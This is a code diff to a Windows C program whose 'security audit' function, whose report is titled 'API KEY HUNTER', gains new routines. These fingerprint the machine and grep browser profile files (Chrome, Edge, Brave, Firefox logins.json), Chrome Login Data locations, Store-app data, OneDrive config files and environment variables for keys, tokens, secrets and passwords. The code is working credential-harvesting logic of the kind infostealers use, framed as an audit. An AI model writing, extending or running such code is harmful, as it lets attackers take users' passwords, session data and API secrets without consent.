@@ -175,6 +175,218 @@ static void dedup_lines(char *buf) {
     for (int i = 0; i < seen_count; i++) free(seen[i]);
 }
 
+/* Detect machine type and architecture from system */
+static void detect_machine_info(char *machine_type, int machine_type_size, char *arch, int arch_size) {
+    strcpy(machine_type, "desktop");
+    strcpy(arch, "x64");
+    
+    /* Detect architecture */
+    SYSTEM_INFO si;
+    GetNativeSystemInfo(&si);
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
+        strcpy(arch, "ARM64");
+    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
+        strcpy(arch, "ARM");
+    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
+        strcpy(arch, "x86");
+    }
+    
+    /* Check system model for Surface/tablet */
+    HKEY hKey;
+    char model[256] = {0};
+    DWORD modelLen = sizeof(model);
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+        "HARDWARE\\DESCRIPTION\\System\\BIOS", 
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
+        RegCloseKey(hKey);
+    }
+    
+    char model_lower[256];
+    strncpy(model_lower, model, sizeof(model_lower)-1);
+    model_lower[sizeof(model_lower)-1] = '\0';
+    for (char *p = model_lower; *p; p++) *p = (char)tolower(*p);
+    
+    if (strstr(model_lower, "surface") != NULL) {
+        if (GetSystemMetrics(SM_TABLETPC)) {
+            strcpy(machine_type, "surface-tablet");
+        } else {
+            strcpy(machine_type, "surface-laptop");
+        }
+    } else if (strstr(model_lower, "tablet") != NULL || strstr(model_lower, "slate") != NULL) {
+        strcpy(machine_type, "tablet");
+    }
+}
+
+/* Check if a directory exists */
+static int dir_exists(const char *path) {
+    DWORD attr = GetFileAttributesA(path);
+    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+/* Check if a file exists */
+static int file_exists(const char *path) {
+    DWORD attr = GetFileAttributesA(path);
+    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+/* Find browser data paths dynamically - handles Chrome, Edge, Brave, Firefox */
+static void scan_browser_data(char *details, int *details_pos, const char *patterns) {
+    char *localappdata = getenv("LOCALAPPDATA");
+    char *appdata = getenv("APPDATA");
+    char cmd[8192];
+    char *result;
+    
+    if (!localappdata) return;
+    
+    /* Chrome - check multiple possible locations */
+    char chrome_path[MAX_PATH];
+    snprintf(chrome_path, sizeof(chrome_path), "%s\\Google\\Chrome\\User Data", localappdata);
+    if (dir_exists(chrome_path)) {
+        snprintf(cmd, sizeof(cmd), 
+            "for /r \"%s\\\" %%f in (Local State,Preferences,Secure Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
+            chrome_path, patterns);
+        result = sys_run_command(cmd);
+        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+            int lines = 0;
+            for (char *p = result; *p; p++) if (*p == '\n') lines++;
+            if (lines > 0) {
+                util_appendf(details, details_pos, "--- CHROME ---\n%s\n", result);
+            }
+        }
+        
+        /* Also scan any profile directories for Login Data or cookies */
+        snprintf(cmd, sizeof(cmd), 
+            "for /d %%d in (\"%s\\Default\",\"%s\\Profile*\") do @if exist \"%%d\\Login Data\" (echo [Chrome profile: %%d])",
+            chrome_path, chrome_path);
+        result = sys_run_command(cmd);
+        if (result && result[0] && strstr(result, "[No output") == NULL) {
+            util_appendf(details, details_pos, "--- CHROME PROFILES ---\n%s\n", result);
+        }
+    }
+    
+    /* Edge - check multiple locations including ARM64 */
+    char edge_paths[4][MAX_PATH];
+    int edge_count = 0;
+    snprintf(edge_paths[edge_count++], MAX_PATH, "%s\\Microsoft\\Edge\\User Data", localappdata);
+    snprintf(edge_paths[edge_count++], MAX_PATH, "%s\\Microsoft\\Edge\\User Data", appdata ? appdata : "");
+    /* Windows on ARM stores Edge in a different location sometimes */
+    snprintf(edge_paths[edge_count++], MAX_PATH, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
+    snprintf(edge_paths[edge_count++], MAX_PATH, "C:\\Program Files\\Microsoft\\Edge\\Application");
+    
+    for (int i = 0; i < edge_count; i++) {
+        if (dir_exists(edge_paths[i])) {
+            snprintf(cmd, sizeof(cmd), 
+                "for /r \"%s\\\" %%f in (Local State,Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
+                edge_paths[i], patterns);
+            result = sys_run_command(cmd);
+            if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+                int lines = 0;
+                for (char *p = result; *p; p++) if (*p == '\n') lines++;
+                if (lines > 0) {
+                    util_appendf(details, details_pos, "--- EDGE ---\n%s\n", result);
+                }
+            }
+            break; /* Only scan the first valid Edge path */
+        }
+    }
+    
+    /* Firefox profiles */
+    char firefox_path[MAX_PATH];
+    snprintf(firefox_path, sizeof(firefox_path), "%s\\Mozilla\\Firefox\\Profiles", appdata ? appdata : "");
+    if (dir_exists(firefox_path)) {
+        snprintf(cmd, sizeof(cmd), 
+            "for /r \"%s\\\" %%f in (*.json,logins.json) do @type \"%%f\" 2>nul | findstr /i /n %s",
+            firefox_path, patterns);
+        result = sys_run_command(cmd);
+        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+            int lines = 0;
+            for (char *p = result; *p; p++) if (*p == '\n') lines++;
+            if (lines > 0) {
+                util_appendf(details, details_pos, "--- FIREFOX ---\n%s\n", result);
+            }
+        }
+    }
+    
+    /* Brave Browser */
+    char brave_path[MAX_PATH];
+    snprintf(brave_path, sizeof(brave_path), "%s\\BraveSoftware\\Brave-Browser\\User Data", localappdata);
+    if (dir_exists(brave_path)) {
+        snprintf(cmd, sizeof(cmd), 
+            "for /r \"%s\\\" %%f in (Local State,Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
+            brave_path, patterns);
+        result = sys_run_command(cmd);
+        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+            int lines = 0;
+            for (char *p = result; *p; p++) if (*p == '\n') lines++;
+            if (lines > 0) {
+                util_appendf(details, details_pos, "--- BRAVE ---\n%s\n", result);
+            }
+        }
+    }
+}
+
+/* Scan UWP/Windows Store app data for credentials (common on Surface tablets) */
+static void scan_uwp_apps(char *details, int *details_pos, const char *patterns) {
+    char *localappdata = getenv("LOCALAPPDATA");
+    if (!localappdata) return;
+    
+    char packages_path[MAX_PATH];
+    snprintf(packages_path, sizeof(packages_path), "%s\\Packages", localappdata);
+    if (!dir_exists(packages_path)) return;
+    
+    char cmd[8192];
+    char *result;
+    
+    /* Scan known UWP app local state directories */
+    snprintf(cmd, sizeof(cmd), 
+        "for /d %%d in (\"%s\\*\") do @if exist \"%%d\\LocalState\" "
+        "(for /r \"%%d\\LocalState\" %%f in (*.json,*.txt,*.xml,*.config) do @type \"%%f\" 2>nul | findstr /i /n %s)",
+        packages_path, patterns);
+    result = sys_run_command(cmd);
+    if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+        int lines = 0;
+        for (char *p = result; *p; p++) if (*p == '\n') lines++;
+        if (lines > 0) {
+            util_appendf(details, details_pos, "--- UWP APPS ---\n%s\n", result);
+        }
+    }
+}
+
+/* Scan OneDrive and cloud sync folders */
+static void scan_cloud_folders(char *details, int *details_pos, const char *patterns) {
+    char *profile = getenv("USERPROFILE");
+    if (!profile) return;
+    
+    char cmd[8192];
+    char *result;
+    
+    /* OneDrive */
+    char onedrive[4][MAX_PATH];
+    int onedrive_count = 0;
+    char *od_env = getenv("OneDrive");
+    if (od_env) snprintf(onedrive[onedrive_count++], MAX_PATH, "%s", od_env);
+    snprintf(onedrive[onedrive_count++], MAX_PATH, "%s\\OneDrive", profile);
+    snprintf(onedrive[onedrive_count++], MAX_PATH, "%s\\OneDrive - %%*", profile);
+    
+    for (int i = 0; i < onedrive_count; i++) {
+        if (dir_exists(onedrive[i])) {
+            snprintf(cmd, sizeof(cmd), 
+                "findstr /i /n /s %s \"%s\\*.env\" \"%s\\*.json\" \"%s\\*.ini\" \"%s\\*.txt\" \"%s\\*.yaml\" \"%s\\*.yml\" 2>nul",
+                patterns, onedrive[i], onedrive[i], onedrive[i], onedrive[i], onedrive[i], onedrive[i]);
+            result = sys_run_command(cmd);
+            if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
+                int lines = 0;
+                for (char *p = result; *p; p++) if (*p == '\n') lines++;
+                if (lines > 0) {
+                    util_appendf(details, details_pos, "--- ONEDRIVE ---\n%s\n", result);
+                }
+            }
+            break;
+        }
+    }
+}
+
 /* Perform full security audit of the system */
 char* config_scan_scan_system(void) {
     static char out[NET_BUF_SIZE];
@@ -184,6 +396,8 @@ char* config_scan_scan_system(void) {
     int key_count = 0;
     char cmd[16384];
     char *result;
+    char machine_type[64] = "desktop";
+    char arch[16] = "x64";
     
     char *profile = getenv("USERPROFILE");
     char *appdata = getenv("APPDATA");
@@ -191,6 +405,9 @@ char* config_scan_scan_system(void) {
     
     out[0] = '\0';
     details[0] = '\0';
+    
+    /* Detect machine info to adapt scan strategy */
+    detect_machine_info(machine_type, sizeof(machine_type), arch, sizeof(arch));
     
     /* Phase 1: C-based file search (native, fast, recursive) — only matching lines */
     if (profile) {
@@ -254,6 +471,7 @@ char* config_scan_scan_system(void) {
         "2>nul", patterns);
     CONFIG_SCAN_RUN("USERPROFILE ROOT", cmd);
     
+    /* Environment variables */
     result = sys_run_command("set | findstr /i /r /c:\"KEY=\" /c:\"SECRET=\" /c:\"TOKEN=\" /c:\"API=\" /c:\"AUTH=\" /c:\"PASS=\"");
     if (result && result[0] && strstr(result, "[No output") == NULL) {
         int lines = 0;
@@ -264,14 +482,48 @@ char* config_scan_scan_system(void) {
         }
     }
     
-    snprintf(cmd, sizeof(cmd), "type \"%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
-    CONFIG_SCAN_RUN("CHROME", cmd);
+    /* Phase 3: Browser data - adaptive based on what's installed */
+    scan_browser_data(details, &details_pos, patterns);
     
-    snprintf(cmd, sizeof(cmd), "type \"%%LOCALAPPDATA%%\\Microsoft\\Edge\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
-    CONFIG_SCAN_RUN("EDGE", cmd);
+    /* Phase 4: Surface/Tablet specific - UWP apps and cloud folders */
+    if (strstr(machine_type, "surface") != NULL || strstr(machine_type, "tablet") != NULL) {
+        scan_uwp_apps(details, &details_pos, patterns);
+        scan_cloud_folders(details, &details_pos, patterns);
+        
+        /* Surface often has Windows Terminal, PowerShell, and dev tools in different locations */
+        char wt_path[MAX_PATH];
+        snprintf(wt_path, sizeof(wt_path), "%s\\Microsoft\\Windows Terminal", localappdata ? localappdata : "");
+        if (dir_exists(wt_path)) {
+            scan_directory(details, &details_pos, wt_path, 2);
+        }
+        
+        /* Windows Subsystem for Linux (WSL) - common on dev Surfaces */
+        if (dir_exists("C:\\Users\\\\wsl.localhost")) {
+            snprintf(cmd, sizeof(cmd), "wsl.exe -l -v 2>nul");
+            result = sys_run_command(cmd);
+            if (result && result[0] && strstr(result, "[Exec failed") == NULL) {
+                util_appendf(details, &details_pos, "--- WSL INSTALLED ---\n%s\n", result);
+            }
+        }
+    }
+    
+    /* Phase 5: ARM-specific paths */
+    if (strcmp(arch, "ARM64") == 0 || strcmp(arch, "ARM") == 0) {
+        /* ARM64 Windows has different Program Files structure */
+        char arm_paths[][MAX_PATH] = {
+            "C:\\Program Files\\WindowsApps",
+            "C:\\Program Files (Arm)"
+        };
+        for (int i = 0; i < 2; i++) {
+            if (dir_exists(arm_paths[i])) {
+                scan_directory(details, &details_pos, arm_paths[i], 1);
+            }
+        }
+    }
     
     /* Build output report */
-    util_appendf(out, &out_pos, "=== API KEY HUNTER ===\n\n");
+    util_appendf(out, &out_pos, "=== API KEY HUNTER ===\n");
+    util_appendf(out, &out_pos, "Machine: %s | Arch: %s\n\n", machine_type, arch);
     if (key_count > 0) {
         util_appendf(out, &out_pos, "Found %d match(es):\n\n", key_count);
         util_appendf(out, &out_pos, "%s", details);
